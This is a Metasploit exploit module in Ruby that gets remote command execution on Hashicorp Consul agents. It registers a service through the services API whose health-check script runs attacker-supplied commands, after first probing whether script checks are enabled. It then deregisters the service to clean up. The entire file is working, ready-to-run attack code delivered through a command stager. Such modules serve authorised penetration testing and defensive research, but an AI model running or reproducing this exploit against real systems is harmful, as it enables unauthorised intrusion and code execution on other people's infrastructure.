##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Hashicorp Consul Remote Command Execution via Services API",
      'Description'    => %q{
        This module exploits Hashicorp Consul's services API to gain remote command
        execution on Consul nodes.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Bharadwaj Machiraju', # Discovery and PoC
          'Francis Alexander', # Discovery and PoC
          'Quentin Kaiser <kaiserquentin[at]gmail.com>' # Metasploit module
        ],
      'References'     =>
        [
          [ 'URL', 'https://www.consul.io/api/agent/service.html' ],
          [ 'URL', 'https://github.com/torque59/Garfield' ]
        ],
      'Platform'        => 'linux',
      'Targets'         => [ [ 'Linux', {} ] ],
      'Payload'         => {},
      'CmdStagerFlavor' => [ 'bourne' ],
      'Privileged'     => false,
      'DefaultOptions' =>
      {
         'SSL' => false,
         'RPORT' => 8500
      },
      'DefaultTarget'  => 0))
    deregister_options('SRVHOST', 'SRVPORT', 'SSLCert', 'URIPATH')
    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path', '/'])
      ])
  end


  def check
    uri = target_uri.path
    res = send_request_cgi({
      'method'   => 'GET',
      'uri'      => normalize_uri(uri, "/v1/agent/self"),
    })
    if res and res.code == 200
      begin
        agent_info = JSON.parse(res.body)
        if agent_info["DebugConfig"]["EnableScriptChecks"] == true
          return Exploit::CheckCode::Vulnerable
        else
          return Exploit::CheckCode::Safe
        end
      rescue JSON::ParserError
        fail_with(Failure::Unknown, 'Failed to parse JSON output.')
      end
    end
    Exploit::CheckCode::Unknown
  end


  def execute_command(cmd, opts = {})
    uri = target_uri.path
    service_name = Rex::Text.rand_text_alpha(5)
    print_status("Creating service '#{service_name}'")

    # unicode encoding for redirection characters. does not work otherwise.
    cmd = cmd.gsub! '>', '\u003e'
    cmd = cmd.gsub! '&', '\u0026'

    # NOTE: Timeout defines how much time the check script will run until
    # getting killed. Arbitrarily set to one day for now.
    res = send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri(uri, 'v1/agent/service/register'),
      'ctype' => 'application/json',
      'data' => "{
        \"ID\":\"#{service_name}\",
        \"Name\":\"#{service_name}\",
        \"Address\":\"127.0.0.1\",
        \"Port\":80,
        \"check\":{
          \"script\":\"#{cmd}\",
          \"interval\":\"10s\",
          \"Timeout\":\"86400s\"
        }
      }"
    })
    if res and res.code == 200
      begin
        print_status("Service '#{service_name}' successfully created.")
      rescue JSON::ParseError
        fail_with(Failure::Unknown, 'Failed to parse JSON output.')
      end
    end
    print_status("Waiting for service '#{service_name}' script to trigger")
    sleep(12)
    print_status("Removing service '#{service_name}'")
    res = send_request_cgi({
      'method' => 'PUT',
      'uri' => normalize_uri(
        uri,
        "v1/agent/service/deregister/#{service_name}"
      ),
    })
    if res and not res.code == 200
      fail_with(
        Failure::Unknown,
        'An error occured when contacting the Consul API.'
      )
    end
  end

  def exploit
    execute_cmdstager()
  end
end
